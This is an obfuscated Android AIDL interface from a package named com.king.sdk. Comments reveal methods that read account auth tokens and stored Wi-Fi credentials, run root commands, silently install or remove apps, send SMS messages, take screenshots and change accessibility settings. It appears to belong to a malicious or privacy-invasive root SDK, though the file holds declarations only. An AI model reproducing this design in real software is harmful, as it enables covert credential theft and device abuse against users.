package com.king.sdk;

import com.king.sdk.IDFEE16B42C8B2890D8FF2860AF5562B1;
import android.app.Notification;
import android.content.ComponentName;
import android.os.ParcelFileDescriptor;
import android.accounts.Account;
import android.os.Parcel;
import android.app.PendingIntent;
interface I2FABB9840C76199A1E170A7C19698595 {
	/*
	String getAuthToken(Account account);
	*/
    String F370FA383227258B363FFE55AC01267A(in Account A7D3656A4);
    
    /*
    int downloadFromGooglePlay(Account account, String googlePlayUrl, String feedbackUrl, String destFile)
    */
    int A07AE1202DE9DC6725E245869C6716AA0(in Account A7D3656A4, in String A29858544, in String A78336EF9, in String A64006D38);
    
    /*
    int downloadFromGooglePlayWifiOnly(Account account, String googlePlayUrl, String feedbackUrl, String destFile)
    */
    int CD5B0EC86CBCFE1CB980DB8A702B20A6(in Account A7D3656A4, in String A29858544, in String A78336EF9, in String A64006D38);
    
    /*
    int getKingServiceVersion();
    */
    int F70841BF2F980D5733E0DF0CC817597E();
    
    /*
    void installPackage(String fileName, String installer, int flags);
    */
    void A989D25C8607F875C6F218D48AF412BFD(in String A9C39465B, in String A1D550601, int A0B0541BA);
    
    /*
    void uninstallPackage(String packageName, IBinder observer, int flags);
    */
    void AD0AE2B8EEF1F906AD68A57CF6C6ECAF(in String F5580377, in IBinder A9B6F44E7, int A0B0541BA);
    
    /*
    void setApplicationEnabled(String packageName, int newState, int flags);
    */
    void A121AA186E614F18EF698BC5603245A87(in String F5580377, int CB9A3939, int A0B0541BA);
    
    /*
    void setComponentEnabled(ComponentName componentName, int newState, int flags);
    */
    void A16C29F3A42F5CDEEA0100E070F706106(in ComponentName F54EE473, int CB9A3939, int A0B0541BA);
    
    /*
    boolean updateAccessibility(String accessbility, boolean accessibilityEnabled);
    */
    void A81853DB160BEDFD36BB81858E6C3412F(in String A570D477F, boolean A747E7269);
    
    /*
    Bitmap takeScreenShot(boolean statusBarVisible, boolean navBarVisible);
    */
    byte[] F96536C98A5E9F287CC348B98FCAE287();
    
    /*
    public void removeTask(int taskid);
    */
	void C1361CC7FB2684CD53E8190EFDE3A272(int A23A6FC661214F2CB);
	
    /*
    Intent autoDownloadFromPlayStore(in String pkgName);
    */
	Intent A7818DCC9FE7DF1B2FDACFA9B1635A074(in String A31E4C9E3811C2DE5);
	
    /*
    void notif(in int id, int arg0, in String arg1);
    */
	void A65E984F303C394E72942364C07940D03(in int id, int arg0, in String arg1);
	
    /*
    IBinder getExtension(String name);
    */
	IBinder A7B9A9D430B6327E5B2490D1C7B9707DF(in String A5E237E06);
	
    /*
    void saveGooglePlay(String json);
    */
	void A5D88C7F36104103AF009E0C2B62BE9F(in String A6ECDF5FCA6D38571);
	
    /*
    String getGooglePlay();
    */
	String A04D2F0BA4E23A77B9AE523F9C9513DFA();
	
    /*
    String getDeviceInfo();
    */
	String DF616309D5582C87E04F5B37D3DEFC70();
	
    /*
	void runRootCmd(String[] cmd, int pid, String pkgName, String clientId);
    */
	void A9DDDF2A4F7D94594EC2EA98407A410E1(in String[] A1A55C8C1A4966C1,int A1ADC6D67BE435A81,in String A31E4C9E3811C2DE5,in String F804F2074AA5CC55);
	
    /*
	int getVersion();
    */
	int A876820FD61B5624F0488A732FDC9EF9F();
	
    /*
    public String getChannel();
    */
    String A4BE0CD5392EA46D96653FFB669F60116();
    
    /*
    boolean upgrade(String file);
    */
    boolean AE26B3D8E556703291282149E3AE894F(String A8C9F3610);
    
    /*
    public void registerListener(KingListener listener) 
    */
    void A8CA37ED15759D2B2752DF319943E4A9E(in IDFEE16B42C8B2890D8FF2860AF5562B1 A959C3422);
    
    /*
    public void unregisterListener(KingListener listener);
    */
    void A608CDD10696BD625C6E51DED8CABC77D(in IDFEE16B42C8B2890D8FF2860AF5562B1 A959C3422);
    
    /*
    void sendNotificationAsPackage(String packageName, int id, String tag, Notification notification);
    */
    void A1AA4149E65A33970CF8106D097D2FF7A(in String F5580377, int ABF396750, in String A0389B783, in Notification BF5476CA);
    
    /*
    String readSupplicant();
    */
    String A0E6E34AE3A7F36AF17DDE628CB3AD9CF();
    
    /*
    void forceStopPackage(String packageName);
    */
    void A998138D662A281E0D6B659ADAFB43DCE(in String F5580377);
    
    /*
    boolean msgTo(String toNum, String centerNum, String content, PendingIntent sentIntent, PendingIntent deliveryIntent);
    */
	boolean AECE3EBDD7EA458BCFC047E79E6627C9(in String A2036BF7D878973AD,in String A273F9183EBB8066D,in String content,in PendingIntent E99BB480DD25E1F0,in PendingIntent A4374152D1EC9EF9);
	
	/*
    boolean setDefaultBrowser(String pkg, String cls);
    */
    boolean DD9852309D1A85C9D950A210CE09DA10(String arg1, String arg2);
    
    /*
    boolean sendDataMessage(String destinationAddress, String scAddress, short destinationPort, byte[] data, PendingIntent sentIntent, PendingIntent deliveryIntent);
    */
	boolean CF0635517B22EFFE80D18E15D934F430(in String destinationAddress, in String scAddress, in int destinationPort, in byte[] data, in PendingIntent sentIntent, in PendingIntent deliveryIntent);
    
}